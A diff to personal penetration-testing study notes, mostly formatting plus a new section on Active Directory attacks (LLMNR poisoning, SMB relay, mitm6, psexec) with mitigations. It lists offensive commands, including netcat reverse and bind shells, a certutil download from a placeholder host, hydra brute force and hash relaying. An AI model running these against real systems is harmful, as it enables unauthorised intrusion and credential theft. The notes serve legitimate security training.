@@ -51,7 +51,7 @@ Transmission Control Protocol (TCP), very reliable. Connection.
 - HTTP(S)
 - SSH
 - RDP
-- SYN -> SYN ACK -> ACK *(Three way handshake)*
+- `SYN -> SYN ACK -> ACK` *(Three way handshake)*
   
 User Datagram Protocol (UDP), less reliable but fast. No connection.
 - Media streeaming
@@ -251,26 +251,26 @@ Then password spray using weak passwords against these e-mails.
 ### Scanning with nmap
 
 Use netdiscover to find other ip's on network.
-- netdiscover -r xxx.xxx.xxx.0/24
+- `netdiscover -r xxx.xxx.xxx.0/24`
 
 nmap:
-- nmap -sS (Stealth scanning [not actually stealthy])
-- SYN SYNACK RST
-- nmap -T4 -p- -A
-  - -T4: Speed between 1-5, 4 is a choice
-  - -p-: Scan all ports
+- `nmap -sS` (Stealth scanning [not actually stealthy])
+- `SYN SYNACK RST`
+- `nmap -T4 -p- -A`
+  - `-T4`: Speed between 1-5, 4 is a choice
+  - `-p-`: Scan all ports
     - Removing scans top 1000 ports.
-    - -p 80,443,53: Scan specific port range
-  - -A: Everything, all data you can find
+    - `-p 80,443,53`: Scan specific port range
+  - `-A`: Everything, all data you can find
 - Host discovery
-  - -sn
-  - -pN
+  - `-sn`
+  - `-pN`
 - Scan techniques
-  - -sS
-  - -sU (UDP scan)
-- -sV: Spen ports for service info
-- -sC: Script scanning
-- -O: OS detection
+  - `-sS`
+  - `-sU` (UDP scan)
+- `-sV`: Spen ports for service info
+- `-sC`: Script scanning
+- `-O`: OS detection
 
 First finding open ports, then getting intel on them is generally a good idea for speed.
 
@@ -283,13 +283,13 @@ Visit webpage if port 80 (HTTP) or port 443 (HTTPS) is exposed.
 nikto:
 - Web vulnerbility scanner
 - Can be frequently autoblocked by websites
-- nikto -h xxx.xxx.xxx.xxx
-  - -h: host
+- `nikto -h xxx.xxx.xxx.xxx`
+  - `-h`: host
 
 dirbuster/dirb/gobuster for directory busting
 
 gobuster:
-- gobuster dir -u http://[url] -w /usr/share/dirbuster/wordlists/[wordlist]
+- `gobuster dir -u http://[url] -w /usr/share/dirbuster/wordlists/[wordlist]`
 
 dirbuster:
 - Enter url: http://xxx.xxx.xxx.xxx:80/
@@ -302,32 +302,32 @@ burpsuite:
 View sourcecode
 
 Find share:
-- showmount -e xxx.xxx.xxx.xxx
-- mkdir /mnt/[dirname]
-- cd /mnt/[dirname]
-- sudo mount -t [name] xxx.xxx.xxx.xxx:/srv/[name] /mnt/[dirname]
+- `showmount -e xxx.xxx.xxx.xxx`
+- `mkdir /mnt/[dirname]`
+- `cd /mnt/[dirname]`
+- `sudo mount -t [name] xxx.xxx.xxx.xxx:/srv/[name] /mnt/[dirname]`
 
 ### Enumeration SMB
 
 Metasploit
-- msfconsole
+- `msfconsole`
   - smb_version detection
 - smbclient
-  - smbclient \\\\\\\\xxx.xxx.xxx.xxx\\\\
+  - `smbclient \\\\\\\\xxx.xxx.xxx.xxx\\\\`
 
 ### Enumeration SSH
 
 ssh
-- ssh xxx.xxx.xxx.xxx -oKexAlgorithms=+... oHostKeyAlgorithms=+... -c ...
+- `ssh xxx.xxx.xxx.xxx -oKexAlgorithms=+... oHostKeyAlgorithms=+... -c ...`
 
 Possibly exposes a banner.
 
 ### Enueration DNS
 
 Check dns server for domains:
-- dnsrecon -r 127.0.0.0/24 -n xxx.xxx.xxx.xxx -d domain
-- nslookup 127.0.0.xxx -d xxx.xxx.xxx.xxx
-- sudo nano /etc/hosts
+- `dnsrecon -r 127.0.0.0/24 -n xxx.xxx.xxx.xxx -d domain`
+- `nslookup 127.0.0.xxx -d xxx.xxx.xxx.xxx`
+- `sudo nano /etc/hosts`
 
 ### Vulnerability research
 
@@ -352,11 +352,11 @@ Bind shell
 
 netcat
 - reverse
-  - nc -lvp 4444
-  - nc xxx.xxx.xxx.xxx -e /bin/sh
+  - `nc -lvp 4444`
+  - `nc xxx.xxx.xxx.xxx -e /bin/sh`
 - bind
-  - nc xxx.xxx.xxx.xxx
-  - nc -lvp 4444 -e /bin/sh
+  - `nc xxx.xxx.xxx.xxx`
+  - `nc -lvp 4444 -e /bin/sh`
 
 ### Staged vs Non-Staged payloads
 
@@ -367,33 +367,33 @@ Non-staged send shellcode all at once. Staged sends it in stages.
 ### Brute force
 
 hydra
-- hydra -l [user] -P /usr/share/wordlists/metasploit/... ssh://xxx.xxx.xxx.xxx -t [threads]
+- `hydra -l [user] -P /usr/share/wordlists/metasploit/... ssh://xxx.xxx.xxx.xxx -t [threads]`
 
-Can also use metasploit.
+Can also use metasploit or burpsuite.
 
 ### Privilege Escalation
 
 linpeas
 - Looks for privilege escalation possibilities.
-- Put in /tmp/ folder
-- After moving linpeas.sh (native on kali) to target, make executable: chmod +x linpeas.sh
-- Execute linpeas.sh
+- Put in `/tmp/` folder
+- After moving `linpeas.sh` (native on kali) to target, make executable: `chmod +x linpeas.sh`
+- Execute `linpeas.sh`
 
 winpeas
 - Looks for privilege escalation possibilities
 - Put in writeable folder
-- certutil.exe -urlcache -f "http://xxx.xxx.xxx.xxx/winPEASx64.exe" winpeas.exe
-- winpeas.exe
+  - `certutil.exe -urlcache -f "http://xxx.xxx.xxx.xxx/winPEASx64.exe" winpeas.exe`
+- `winpeas.exe`
 
 If you can upload something, try to upload a reverse shell script while listening to see if it runs.
 
-Use pspy to find running processes.
+Use `pspy` to find running processes.
 
 On processes that run periodically: try edit the process to include a 1-line reverse shell.
 
 Cracking zips quickly:
-- fcrackzip
-  - fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [zipfile]
+- `fcrackzip`
+  - `fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [zipfile]`
 
 Local file inclusion exploit can lead to information disclosure.
 
@@ -402,4 +402,136 @@ GTFOBins
 
 Simple shell to fully interactive shell
 - ttyshell
-  - python -c 'import pty; pty.spawn("/bin/bash")'
+  - `python -c 'import pty; pty.spawn("/bin/bash")'`
+
+## Attacking active directory
+
+### Initial attack vectors
+
+Usually drop of a device to simulate breaking into the network of a client.
+
+#### LLMNR Poisoning
+
+LLMNR Link Local Multicast Name Resolution
+
+Used to ID hosts when DNS fails to do so, previously NBT-NS.
+
+Key flaw is that capturing traffic gives us a name and hash. (Man in the middle attack)
+
+Steps:
+- Edit and run responder
+  - `sudo mousepad /etc/responder/Responder.conf` *(Make sure all options are on)*
+  - `sudo responder -I eth0 -dP`
+- An event occurs...
+- Get dem hashes
+- Crack dem hashes
+  - `hashcat -m [mode] hashes/hashes.txt rockyou.txt`
+
+Mitigation:
+- Disable LLMNR & NBT-NS
+- If not possible:
+  - Require Network Access Control
+  - Require strong user passwords
+
+#### SMB relay attacks
+
+Instead of capturing hash with responder, relay it with SMB.
+- SMB signing must be disabled or not enforced on the target.
+- Relayed user credentials must be admin on machine for any real value.
+- Can't relay to yourself, you have to relay to a different machine.
+
+Steps:
+- Identify hosts without smb signing
+  - `nmap --script=smb2-security-mode.nse -p445 xxx.xxx.xxx.0/24` *(Add -Pn for better probing)*
+- Edit and run responder
+  - `sudo mousepad /etc/responder/Responder.conf` *(Make sure HTTP & SMB are off)*
+  - `sudo responder -I eth0 -dP`
+- Setup ntlmrelayx
+  - `sudo ntlmrelayx.py -tf targets.txt -smb2support --no-wcf-server --no-raw-server --no-winrm-server --no-rpc-server`
+- An event occurs...
+- Win
+- Other wins
+  - `nc 127.0.0.1 11000`
+  - `sudo ntlmrelayx.py -tf targets.txt -smb2support -i` *(Get interactive shell)*
+  - `sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` *(Run commands)*
+
+Mitigation:
+- Enable SMB signing on all devices
+- Disable NTLM authentication on network
+- Account tiering
+  - Limit domain admins to specific tasks (least privilege)
+- Local admin restriction
+  - This attack is non-viable without local admin rights
+
+#### Gaining shell access
+
+Metasploit - with password
+- `use exploit/windows/smb/psexec`
+
+Metasploit - with hash
+- `use exploit/windows/smb/psexec`
+
+psexec.py - with password
+- `psexec.py marvel.local/fcastle:'P@$$w0rd!'@xxx.xxx.xxx.xxx`
+
+psexec.py - with hash
+- `psexec.py administrator@xxx.xxx.xxx.xxx -hashes LM:NT`
+
+Alternatives to `psexec.py`, use `wmiexec.py` or use `smbexec.py`.
+
+#### IPv6 attacks
+
+Abuse that noone does DNS for IPv6 if devices use IPv4.
+
+We can play the role of DNS for IPv6.
+
+Get SMB or LDAP access to Domain Controller.
+
+We can relay NTLM through LDAP to the DC.
+
+This is called Man in the Middle 6 *(MitM6)*.
+
+Steps:
+- Setup `ntlmrelayx.py`
+  - `ntlmrelayx.py -6 -t ldaps://192.168.4.128 -wh fakewpad.marvel.local -l lootme`
+- Launch MitM6
+  - `sudo mitm6 -d [domain]`
+- Now collect ye plunder in `lootme`
+- Look for outdated devices to easily exploit in `domain_computers.html`
+- Look at `domain_users_by_group.html` to identify targets
+  - Check out descriptions!
+
+Mitigation:
+- Disable IPv6 internally *(Bad idea)*
+- Issue blocks:
+  - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
+  - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
+  - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)
+- Disable WPAD *(If not internally in use)* by disabling the `WinHttpAutoProxySvc`
+- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
+- Consider adding Administrative users to the Protected Users group or marking them as sensitive and not to be delegated, which will prevent any impersonation of that user via delegation.
+
+#### Passback attacks
+
+Access to something that connects to LDAP or does an SMB connection. *(printers, eg.)*
+
+Changing LDAP to attacker IP address and setting up listener sends the password in cleartext, even if the password is obfuscated in the text.
+
+#### Initial Internal Attack Strategy
+
+Enumeration is the most important thing!!!
+
+Begin the day with `mitm6` or `responder`.
+
+Run scans to generate traffic, nessus, nmap, etc.
+
+If scans take too long, look for websites in scope.
+
+Look for default credentials on web logins
+- Printers
+- Jenkins
+- Etc...
+
+Think outside the box :)
+
+If nothing works and everything looks good, ask the client to possibly create credentials for us.
